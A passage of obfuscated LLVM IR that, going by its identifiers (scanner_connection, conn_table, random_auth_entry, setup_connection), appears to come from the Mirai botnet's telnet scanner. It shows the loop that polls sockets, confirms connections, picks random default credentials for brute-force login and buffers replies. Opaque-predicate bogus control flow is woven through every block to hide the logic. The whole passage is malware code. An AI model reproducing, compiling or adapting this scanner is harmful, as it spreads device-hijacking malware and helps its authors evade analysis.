  %747 = icmp eq i32 %746, 0
  %748 = icmp slt i32 %743, 10
  %749 = or i1 %747, %748
  br i1 %749, label %originalBB100, label %originalBB100alteredBB

originalBB100:                                    ; preds = %originalBB100alteredBB, %741
  %750 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %751 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %750, i32 0, i32 8
  %752 = load i8, i8* %751, align 8
  %753 = add i8 %752, 1
  store i8 %753, i8* %751, align 8
  %754 = zext i8 %753 to i32
  %755 = icmp eq i32 %754, 10
  %756 = load i32, i32* @x.53
  %757 = load i32, i32* @y.54
  %758 = sub i32 %756, 1
  %759 = mul i32 %756, %758
  %760 = urem i32 %759, 2
  %761 = icmp eq i32 %760, 0
  %762 = icmp slt i32 %757, 10
  %763 = or i1 %761, %762
  br i1 %763, label %originalBBpart2111, label %originalBB100alteredBB

originalBBpart2111:                               ; preds = %originalBB100
  br i1 %755, label %764, label %769

; <label>:764:                                    ; preds = %originalBBpart2111
  %765 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %766 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %765, i32 0, i32 8
  store i8 0, i8* %766, align 8
  %767 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %768 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %767, i32 0, i32 3
  store i32 0, i32* %768, align 8
  br label %771

; <label>:769:                                    ; preds = %originalBBpart2111
  %770 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* %770)
  br label %771

; <label>:771:                                    ; preds = %769, %764
  %772 = load i32, i32* @x.53
  %773 = load i32, i32* @y.54
  %774 = sub i32 %772, 1
  %775 = mul i32 %772, %774
  %776 = urem i32 %775, 2
  %777 = icmp eq i32 %776, 0
  %778 = icmp slt i32 %773, 10
  %779 = or i1 %777, %778
  br i1 %779, label %originalBB113, label %originalBB113alteredBB

originalBB113:                                    ; preds = %originalBB113alteredBB, %771
  %780 = load i32, i32* @x.53
  %781 = load i32, i32* @y.54
  %782 = sub i32 %780, 1
  %783 = mul i32 %780, %782
  %784 = urem i32 %783, 2
  %785 = icmp eq i32 %784, 0
  %786 = icmp slt i32 %781, 10
  %787 = or i1 %785, %786
  br i1 %787, label %originalBBpart2115, label %originalBB113alteredBB

originalBBpart2115:                               ; preds = %originalBB113
  br label %793

; <label>:788:                                    ; preds = %730
  %789 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %790 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %789, i32 0, i32 8
  store i8 0, i8* %790, align 8
  %791 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %792 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %791, i32 0, i32 3
  store i32 0, i32* %792, align 8
  br label %793

; <label>:793:                                    ; preds = %788, %originalBBpart2115
  %794 = load i32, i32* @x.53
  %795 = load i32, i32* @y.54
  %796 = sub i32 %794, 1
  %797 = mul i32 %794, %796
  %798 = urem i32 %797, 2
  %799 = icmp eq i32 %798, 0
  %800 = icmp slt i32 %795, 10
  %801 = or i1 %799, %800
  br i1 %801, label %originalBB117, label %originalBB117alteredBB

originalBB117:                                    ; preds = %originalBB117alteredBB, %793
  %802 = load i32, i32* @x.53
  %803 = load i32, i32* @y.54
  %804 = sub i32 %802, 1
  %805 = mul i32 %802, %804
  %806 = urem i32 %805, 2
  %807 = icmp eq i32 %806, 0
  %808 = icmp slt i32 %803, 10
  %809 = or i1 %807, %808
  br i1 %809, label %originalBBpart2119, label %originalBB117alteredBB

originalBBpart2119:                               ; preds = %originalBB117
  br label %938

; <label>:810:                                    ; preds = %722, %708
  %811 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %812 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %811, i32 0, i32 3
  %813 = load i32, i32* %812, align 8
  %814 = icmp eq i32 %813, 1
  br i1 %814, label %815, label %841

; <label>:815:                                    ; preds = %810
  %816 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %817 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %816, i32 0, i32 1
  %818 = load i32, i32* %817, align 8
  %819 = srem i32 %818, 64
  %820 = zext i32 %819 to i64
  %821 = shl i64 1, %820
  %822 = getelementptr inbounds %struct.fd_set.30, %struct.fd_set.30* %6, i32 0, i32 0
  %823 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %824 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %823, i32 0, i32 1
  %825 = load i32, i32* %824, align 8
  %826 = sdiv i32 %825, 64
  %827 = sext i32 %826 to i64
  %828 = getelementptr inbounds [16 x i64], [16 x i64]* %822, i64 0, i64 %827
  %829 = load i64, i64* %828, align 8
  %830 = or i64 %829, %821
  store i64 %830, i64* %828, align 8
  %831 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %832 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %831, i32 0, i32 1
  %833 = load i32, i32* %832, align 8
  %834 = load i32, i32* %12, align 4
  %835 = icmp sgt i32 %833, %834
  br i1 %835, label %836, label %840

; <label>:836:                                    ; preds = %815
  %837 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %838 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %837, i32 0, i32 1
  %839 = load i32, i32* %838, align 8
  store i32 %839, i32* %12, align 4
  br label %840

; <label>:840:                                    ; preds = %836, %815
  br label %921

; <label>:841:                                    ; preds = %810
  %842 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %843 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %842, i32 0, i32 3
  %844 = load i32, i32* %843, align 8
  %845 = icmp ne i32 %844, 0
  br i1 %845, label %846, label %904

; <label>:846:                                    ; preds = %841
  %847 = load i32, i32* @x.53
  %848 = load i32, i32* @y.54
  %849 = sub i32 %847, 1
  %850 = mul i32 %847, %849
  %851 = urem i32 %850, 2
  %852 = icmp eq i32 %851, 0
  %853 = icmp slt i32 %848, 10
  %854 = or i1 %852, %853
  br i1 %854, label %originalBB121, label %originalBB121alteredBB

originalBB121:                                    ; preds = %originalBB121alteredBB, %846
  %855 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %856 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %855, i32 0, i32 1
  %857 = load i32, i32* %856, align 8
  %858 = srem i32 %857, 64
  %859 = zext i32 %858 to i64
  %860 = shl i64 1, %859
  %861 = getelementptr inbounds %struct.fd_set.30, %struct.fd_set.30* %5, i32 0, i32 0
  %862 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %863 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %862, i32 0, i32 1
  %864 = load i32, i32* %863, align 8
  %865 = sdiv i32 %864, 64
  %866 = sext i32 %865 to i64
  %867 = getelementptr inbounds [16 x i64], [16 x i64]* %861, i64 0, i64 %866
  %868 = load i64, i64* %867, align 8
  %869 = or i64 %868, %860
  store i64 %869, i64* %867, align 8
  %870 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %871 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %870, i32 0, i32 1
  %872 = load i32, i32* %871, align 8
  %873 = load i32, i32* %11, align 4
  %874 = icmp sgt i32 %872, %873
  %875 = load i32, i32* @x.53
  %876 = load i32, i32* @y.54
  %877 = sub i32 %875, 1
  %878 = mul i32 %875, %877
  %879 = urem i32 %878, 2
  %880 = icmp eq i32 %879, 0
  %881 = icmp slt i32 %876, 10
  %882 = or i1 %880, %881
  br i1 %882, label %originalBBpart2159, label %originalBB121alteredBB

originalBBpart2159:                               ; preds = %originalBB121
  br i1 %874, label %883, label %903

; <label>:883:                                    ; preds = %originalBBpart2159
  %884 = load i32, i32* @x.53
  %885 = load i32, i32* @y.54
  %886 = sub i32 %884, 1
  %887 = mul i32 %884, %886
  %888 = urem i32 %887, 2
  %889 = icmp eq i32 %888, 0
  %890 = icmp slt i32 %885, 10
  %891 = or i1 %889, %890
  br i1 %891, label %originalBB161, label %originalBB161alteredBB

originalBB161:                                    ; preds = %originalBB161alteredBB, %883
  %892 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %893 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %892, i32 0, i32 1
  %894 = load i32, i32* %893, align 8
  store i32 %894, i32* %11, align 4
  %895 = load i32, i32* @x.53
  %896 = load i32, i32* @y.54
  %897 = sub i32 %895, 1
  %898 = mul i32 %895, %897
  %899 = urem i32 %898, 2
  %900 = icmp eq i32 %899, 0
  %901 = icmp slt i32 %896, 10
  %902 = or i1 %900, %901
  br i1 %902, label %originalBBpart2163, label %originalBB161alteredBB

originalBBpart2163:                               ; preds = %originalBB161
  br label %903

; <label>:903:                                    ; preds = %originalBBpart2163, %originalBBpart2159
  br label %904

; <label>:904:                                    ; preds = %903, %841
  %905 = load i32, i32* @x.53
  %906 = load i32, i32* @y.54
  %907 = sub i32 %905, 1
  %908 = mul i32 %905, %907
  %909 = urem i32 %908, 2
  %910 = icmp eq i32 %909, 0
  %911 = icmp slt i32 %906, 10
  %912 = or i1 %910, %911
  br i1 %912, label %originalBB165, label %originalBB165alteredBB

originalBB165:                                    ; preds = %originalBB165alteredBB, %904
  %913 = load i32, i32* @x.53
  %914 = load i32, i32* @y.54
  %915 = sub i32 %913, 1
  %916 = mul i32 %913, %915
  %917 = urem i32 %916, 2
  %918 = icmp eq i32 %917, 0
  %919 = icmp slt i32 %914, 10
  %920 = or i1 %918, %919
  br i1 %920, label %originalBBpart2167, label %originalBB165alteredBB

originalBBpart2167:                               ; preds = %originalBB165
  br label %921

; <label>:921:                                    ; preds = %originalBBpart2167, %840
  %922 = load i32, i32* @x.53
  %923 = load i32, i32* @y.54
  %924 = sub i32 %922, 1
  %925 = mul i32 %922, %924
  %926 = urem i32 %925, 2
  %927 = icmp eq i32 %926, 0
  %928 = icmp slt i32 %923, 10
  %929 = or i1 %927, %928
  br i1 %929, label %originalBB169, label %originalBB169alteredBB

originalBB169:                                    ; preds = %originalBB169alteredBB, %921
  %930 = load i32, i32* @x.53
  %931 = load i32, i32* @y.54
  %932 = sub i32 %930, 1
  %933 = mul i32 %930, %932
  %934 = urem i32 %933, 2
  %935 = icmp eq i32 %934, 0
  %936 = icmp slt i32 %931, 10
  %937 = or i1 %935, %936
  br i1 %937, label %originalBBpart2171, label %originalBB169alteredBB

originalBBpart2171:                               ; preds = %originalBB169
  br label %938

; <label>:938:                                    ; preds = %originalBBpart2171, %originalBBpart2119
  %939 = load i32, i32* %1, align 4
  %940 = add nsw i32 %939, 1
  store i32 %940, i32* %1, align 4
  br label %689

; <label>:941:                                    ; preds = %originalBBpart298
  %942 = getelementptr inbounds %struct.timeval.31, %struct.timeval.31* %8, i32 0, i32 1
  store i64 0, i64* %942, align 8
  %943 = getelementptr inbounds %struct.timeval.31, %struct.timeval.31* %8, i32 0, i32 0
  store i64 1, i64* %943, align 8
  %944 = load i32, i32* %12, align 4
  %945 = load i32, i32* %11, align 4
  %946 = icmp sgt i32 %944, %945
  br i1 %946, label %947, label %949

; <label>:947:                                    ; preds = %941
  %948 = load i32, i32* %12, align 4
  br label %951

; <label>:949:                                    ; preds = %941
  %950 = load i32, i32* %11, align 4
  br label %951

; <label>:951:                                    ; preds = %949, %947
  %952 = phi i32 [ %948, %947 ], [ %950, %949 ]
  %953 = add nsw i32 1, %952
  %954 = call i32 @select(i32 %953, %struct.fd_set.30* %5, %struct.fd_set.30* %6, %struct.fd_set.30* null, %struct.timeval.31* %8)
  store i32 %954, i32* %13, align 4
  %955 = call i64 @time(i64* null) #6
  %956 = trunc i64 %955 to i32
  store i32 %956, i32* @fake_time, align 4
  store i32 0, i32* %1, align 4
  br label %957

; <label>:957:                                    ; preds = %1696, %951
  %958 = load i32, i32* %1, align 4
  %959 = icmp slt i32 %958, 256
  br i1 %959, label %960, label %1699

; <label>:960:                                    ; preds = %957
  %961 = load i32, i32* @x.53
  %962 = load i32, i32* @y.54
  %963 = sub i32 %961, 1
  %964 = mul i32 %961, %963
  %965 = urem i32 %964, 2
  %966 = icmp eq i32 %965, 0
  %967 = icmp slt i32 %962, 10
  %968 = or i1 %966, %967
  br i1 %968, label %originalBB173, label %originalBB173alteredBB

originalBB173:                                    ; preds = %originalBB173alteredBB, %960
  %969 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %970 = load i32, i32* %1, align 4
  %971 = sext i32 %970 to i64
  %972 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %969, i64 %971
  store %struct.scanner_connection* %972, %struct.scanner_connection** %7, align 8
  %973 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %974 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %973, i32 0, i32 1
  %975 = load i32, i32* %974, align 8
  %976 = icmp eq i32 %975, -1
  %977 = load i32, i32* @x.53
  %978 = load i32, i32* @y.54
  %979 = sub i32 %977, 1
  %980 = mul i32 %977, %979
  %981 = urem i32 %980, 2
  %982 = icmp eq i32 %981, 0
  %983 = icmp slt i32 %978, 10
  %984 = or i1 %982, %983
  br i1 %984, label %originalBBpart2175, label %originalBB173alteredBB

originalBBpart2175:                               ; preds = %originalBB173
  br i1 %976, label %985, label %986

; <label>:985:                                    ; preds = %originalBBpart2175
  br label %1696

; <label>:986:                                    ; preds = %originalBBpart2175
  %987 = getelementptr inbounds %struct.fd_set.30, %struct.fd_set.30* %6, i32 0, i32 0
  %988 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %989 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %988, i32 0, i32 1
  %990 = load i32, i32* %989, align 8
  %991 = sdiv i32 %990, 64
  %992 = sext i32 %991 to i64
  %993 = getelementptr inbounds [16 x i64], [16 x i64]* %987, i64 0, i64 %992
  %994 = load i64, i64* %993, align 8
  %995 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %996 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %995, i32 0, i32 1
  %997 = load i32, i32* %996, align 8
  %998 = srem i32 %997, 64
  %999 = zext i32 %998 to i64
  %1000 = shl i64 1, %999
  %1001 = and i64 %994, %1000
  %1002 = icmp ne i64 %1001, 0
  br i1 %1002, label %1003, label %1034

; <label>:1003:                                   ; preds = %986
  store i32 0, i32* %29, align 4
  store i32 0, i32* %30, align 4
  store i32 4, i32* %31, align 4
  %1004 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1005 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1004, i32 0, i32 1
  %1006 = load i32, i32* %1005, align 8
  %1007 = bitcast i32* %29 to i8*
  %1008 = call i32 @getsockopt(i32 %1006, i32 1, i32 4, i8* %1007, i32* %31) #6
  store i32 %1008, i32* %30, align 4
  %1009 = load i32, i32* %29, align 4
  %1010 = icmp eq i32 %1009, 0
  br i1 %1010, label %1011, label %1022

; <label>:1011:                                   ; preds = %1003
  %1012 = load i32, i32* %30, align 4
  %1013 = icmp eq i32 %1012, 0
  br i1 %1013, label %1014, label %1022

; <label>:1014:                                   ; preds = %1011
  %1015 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1016 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1015, i32 0, i32 3
  store i32 2, i32* %1016, align 8
  %1017 = call %struct.scanner_auth* @random_auth_entry()
  %1018 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1019 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1018, i32 0, i32 0
  store %struct.scanner_auth* %1017, %struct.scanner_auth** %1019, align 8
  %1020 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1021 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1020, i32 0, i32 6
  store i32 0, i32* %1021, align 4
  br label %1033

; <label>:1022:                                   ; preds = %1011, %1003
  %1023 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1024 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1023, i32 0, i32 1
  %1025 = load i32, i32* %1024, align 8
  %1026 = call i32 @close(i32 %1025)
  %1027 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1028 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1027, i32 0, i32 1
  store i32 -1, i32* %1028, align 8
  %1029 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1030 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1029, i32 0, i32 8
  store i8 0, i8* %1030, align 8
  %1031 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1032 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1031, i32 0, i32 3
  store i32 0, i32* %1032, align 8
  br label %1696

; <label>:1033:                                   ; preds = %1014
  br label %1034

; <label>:1034:                                   ; preds = %1033, %986
  %1035 = getelementptr inbounds %struct.fd_set.30, %struct.fd_set.30* %5, i32 0, i32 0
  %1036 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1037 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1036, i32 0, i32 1
  %1038 = load i32, i32* %1037, align 8
  %1039 = sdiv i32 %1038, 64
  %1040 = sext i32 %1039 to i64
  %1041 = getelementptr inbounds [16 x i64], [16 x i64]* %1035, i64 0, i64 %1040
  %1042 = load i64, i64* %1041, align 8
  %1043 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1044 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1043, i32 0, i32 1
  %1045 = load i32, i32* %1044, align 8
  %1046 = srem i32 %1045, 64
  %1047 = zext i32 %1046 to i64
  %1048 = shl i64 1, %1047
  %1049 = and i64 %1042, %1048
  %1050 = icmp ne i64 %1049, 0
  br i1 %1050, label %1051, label %1695

; <label>:1051:                                   ; preds = %1034
  br label %1052

; <label>:1052:                                   ; preds = %1677, %1051
  %1053 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1054 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1053, i32 0, i32 3
  %1055 = load i32, i32* %1054, align 8
  %1056 = icmp eq i32 %1055, 0
  br i1 %1056, label %1057, label %1074

; <label>:1057:                                   ; preds = %1052
  %1058 = load i32, i32* @x.53
  %1059 = load i32, i32* @y.54
  %1060 = sub i32 %1058, 1
  %1061 = mul i32 %1058, %1060
  %1062 = urem i32 %1061, 2
  %1063 = icmp eq i32 %1062, 0
  %1064 = icmp slt i32 %1059, 10
  %1065 = or i1 %1063, %1064
  br i1 %1065, label %originalBB177, label %originalBB177alteredBB

originalBB177:                                    ; preds = %originalBB177alteredBB, %1057
  %1066 = load i32, i32* @x.53
  %1067 = load i32, i32* @y.54
  %1068 = sub i32 %1066, 1
  %1069 = mul i32 %1066, %1068
  %1070 = urem i32 %1069, 2
  %1071 = icmp eq i32 %1070, 0
  %1072 = icmp slt i32 %1067, 10
  %1073 = or i1 %1071, %1072
  br i1 %1073, label %originalBBpart2179, label %originalBB177alteredBB

originalBBpart2179:                               ; preds = %originalBB177
  br label %1678

; <label>:1074:                                   ; preds = %1052
  %1075 = load i32, i32* @x.53
  %1076 = load i32, i32* @y.54
  %1077 = sub i32 %1075, 1
  %1078 = mul i32 %1075, %1077
  %1079 = urem i32 %1078, 2
  %1080 = icmp eq i32 %1079, 0
  %1081 = icmp slt i32 %1076, 10
  %1082 = or i1 %1080, %1081
  br i1 %1082, label %originalBB181, label %originalBB181alteredBB

originalBB181:                                    ; preds = %originalBB181alteredBB, %1074
  %1083 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1084 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1083, i32 0, i32 6
  %1085 = load i32, i32* %1084, align 4
  %1086 = icmp eq i32 %1085, 256
  %1087 = load i32, i32* @x.53
  %1088 = load i32, i32* @y.54
  %1089 = sub i32 %1087, 1
  %1090 = mul i32 %1087, %1089
  %1091 = urem i32 %1090, 2
  %1092 = icmp eq i32 %1091, 0
  %1093 = icmp slt i32 %1088, 10
  %1094 = or i1 %1092, %1093
  br i1 %1094, label %originalBBpart2183, label %originalBB181alteredBB

originalBBpart2183:                               ; preds = %originalBB181
  br i1 %1086, label %1095, label %1107

; <label>:1095:                                   ; preds = %originalBBpart2183
  %1096 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1097 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1096, i32 0, i32 7
  %1098 = getelementptr inbounds [256 x i8], [256 x i8]* %1097, i32 0, i32 0
  %1099 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1100 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1099, i32 0, i32 7
  %1101 = getelementptr inbounds [256 x i8], [256 x i8]* %1100, i32 0, i32 0
  %1102 = getelementptr inbounds i8, i8* %1101, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1098, i8* %1102, i64 192, i32 1, i1 false)
  %1103 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1104 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1103, i32 0, i32 6
  %1105 = load i32, i32* %1104, align 4
  %1106 = sub nsw i32 %1105, 64
  store i32 %1106, i32* %1104, align 4
  br label %1107

; <label>:1107:                                   ; preds = %1095, %originalBBpart2183
  %1108 = load i32, i32* @x.53
  %1109 = load i32, i32* @y.54
  %1110 = sub i32 %1108, 1
  %1111 = mul i32 %1108, %1110
  %1112 = urem i32 %1111, 2
  %1113 = icmp eq i32 %1112, 0
  %1114 = icmp slt i32 %1109, 10
  %1115 = or i1 %1113, %1114
  br i1 %1115, label %originalBB185, label %originalBB185alteredBB

originalBB185:                                    ; preds = %originalBB185alteredBB, %1107
  %1116 = call i32* @__errno_location() #7
  store i32 0, i32* %1116, align 4
  %1117 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1118 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1117, i32 0, i32 1
  %1119 = load i32, i32* %1118, align 8
  %1120 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1121 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1120, i32 0, i32 7
  %1122 = getelementptr inbounds [256 x i8], [256 x i8]* %1121, i32 0, i32 0
  %1123 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1124 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1123, i32 0, i32 6
  %1125 = load i32, i32* %1124, align 4
  %1126 = sext i32 %1125 to i64
  %1127 = getelementptr inbounds i8, i8* %1122, i64 %1126
  %1128 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1129 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1128, i32 0, i32 6
  %1130 = load i32, i32* %1129, align 4
  %1131 = sub nsw i32 256, %1130
  %1132 = call i32 @recv_strip_null(i32 %1119, i8* %1127, i32 %1131, i32 16384)
  store i32 %1132, i32* %32, align 4
  %1133 = load i32, i32* %32, align 4
  %1134 = icmp eq i32 %1133, 0
  %1135 = load i32, i32* @x.53
  %1136 = load i32, i32* @y.54
  %1137 = sub i32 %1135, 1
  %1138 = mul i32 %1135, %1137
  %1139 = urem i32 %1138, 2
  %1140 = icmp eq i32 %1139, 0
  %1141 = icmp slt i32 %1136, 10
  %1142 = or i1 %1140, %1141
  br i1 %1142, label %originalBBpart2192, label %originalBB185alteredBB

originalBBpart2192:                               ; preds = %originalBB185
  br i1 %1134, label %1143, label %1145

; <label>:1143:                                   ; preds = %originalBBpart2192
  %1144 = call i32* @__errno_location() #7
  store i32 104, i32* %1144, align 4
  store i32 -1, i32* %32, align 4
  br label %1145

; <label>:1145:                                   ; preds = %1143, %originalBBpart2192
  %1146 = load i32, i32* %32, align 4
  %1147 = icmp eq i32 %1146, -1
  br i1 %1147, label %1148, label %1226

; <label>:1148:                                   ; preds = %1145
  %1149 = call i32* @__errno_location() #7
  %1150 = load i32, i32* %1149, align 4
  %1151 = icmp ne i32 %1150, 11
  br i1 %1151, label %1152, label %1209

; <label>:1152:                                   ; preds = %1148
  %1153 = load i32, i32* @x.53
  %1154 = load i32, i32* @y.54
  %1155 = sub i32 %1153, 1
  %1156 = mul i32 %1153, %1155
  %1157 = urem i32 %1156, 2
  %1158 = icmp eq i32 %1157, 0
  %1159 = icmp slt i32 %1154, 10
  %1160 = or i1 %1158, %1159
  br i1 %1160, label %originalBB194, label %originalBB194alteredBB

originalBB194:                                    ; preds = %originalBB194alteredBB, %1152
  %1161 = call i32* @__errno_location() #7
  %1162 = load i32, i32* %1161, align 4
  %1163 = icmp ne i32 %1162, 11
  %1164 = load i32, i32* @x.53
  %1165 = load i32, i32* @y.54
  %1166 = sub i32 %1164, 1
  %1167 = mul i32 %1164, %1166
  %1168 = urem i32 %1167, 2
  %1169 = icmp eq i32 %1168, 0
  %1170 = icmp slt i32 %1165, 10
  %1171 = or i1 %1169, %1170
  br i1 %1171, label %originalBBpart2196, label %originalBB194alteredBB

originalBBpart2196:                               ; preds = %originalBB194
  br i1 %1163, label %1172, label %1209

; <label>:1172:                                   ; preds = %originalBBpart2196
  %1173 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1174 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1173, i32 0, i32 1
  %1175 = load i32, i32* %1174, align 8
  %1176 = call i32 @close(i32 %1175)
  %1177 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1178 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1177, i32 0, i32 1
  store i32 -1, i32* %1178, align 8
  %1179 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1180 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1179, i32 0, i32 8
  %1181 = load i8, i8* %1180, align 8
  %1182 = add i8 %1181, 1
  store i8 %1182, i8* %1180, align 8
  %1183 = zext i8 %1182 to i32
  %1184 = icmp sge i32 %1183, 10
  br i1 %1184, label %1185, label %1190

; <label>:1185:                                   ; preds = %1172
  %1186 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1187 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1186, i32 0, i32 8
  store i8 0, i8* %1187, align 8
  %1188 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1189 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1188, i32 0, i32 3
  store i32 0, i32* %1189, align 8
  br label %1192

; <label>:1190:                                   ; preds = %1172
  %1191 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* %1191)
  br label %1192

; <label>:1192:                                   ; preds = %1190, %1185
  %1193 = load i32, i32* @x.53
  %1194 = load i32, i32* @y.54
  %1195 = sub i32 %1193, 1
  %1196 = mul i32 %1193, %1195
  %1197 = urem i32 %1196, 2
  %1198 = icmp eq i32 %1197, 0
  %1199 = icmp slt i32 %1194, 10
  %1200 = or i1 %1198, %1199
  br i1 %1200, label %originalBB198, label %originalBB198alteredBB

originalBB198:                                    ; preds = %originalBB198alteredBB, %1192
  %1201 = load i32, i32* @x.53
  %1202 = load i32, i32* @y.54
  %1203 = sub i32 %1201, 1
  %1204 = mul i32 %1201, %1203
  %1205 = urem i32 %1204, 2
  %1206 = icmp eq i32 %1205, 0
  %1207 = icmp slt i32 %1202, 10
  %1208 = or i1 %1206, %1207
  br i1 %1208, label %originalBBpart2200, label %originalBB198alteredBB

originalBBpart2200:                               ; preds = %originalBB198
  br label %1209

; <label>:1209:                                   ; preds = %originalBBpart2200, %originalBBpart2196, %1148
  %1210 = load i32, i32* @x.53
  %1211 = load i32, i32* @y.54
  %1212 = sub i32 %1210, 1
  %1213 = mul i32 %1210, %1212
  %1214 = urem i32 %1213, 2
  %1215 = icmp eq i32 %1214, 0
  %1216 = icmp slt i32 %1211, 10
  %1217 = or i1 %1215, %1216
  br i1 %1217, label %originalBB202, label %originalBB202alteredBB

originalBB202:                                    ; preds = %originalBB202alteredBB, %1209
  %1218 = load i32, i32* @x.53
  %1219 = load i32, i32* @y.54
  %1220 = sub i32 %1218, 1
  %1221 = mul i32 %1218, %1220
  %1222 = urem i32 %1221, 2
  %1223 = icmp eq i32 %1222, 0
  %1224 = icmp slt i32 %1219, 10
  %1225 = or i1 %1223, %1224
  br i1 %1225, label %originalBBpart2204, label %originalBB202alteredBB

originalBBpart2204:                               ; preds = %originalBB202
  br label %1678

; <label>:1226:                                   ; preds = %1145
  %1227 = load i32, i32* %32, align 4
  %1228 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1229 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1228, i32 0, i32 6
  %1230 = load i32, i32* %1229, align 4
  %1231 = add nsw i32 %1230, %1227
  store i32 %1231, i32* %1229, align 4
  %1232 = load i32, i32* @fake_time, align 4
  %1233 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1234 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1233, i32 0, i32 2
  store i32 %1232, i32* %1234, align 4
  br label %1235

; <label>:1235:                                   ; preds = %1676, %1226
  store i32 0, i32* %33, align 4
  %1236 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1237 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1236, i32 0, i32 3
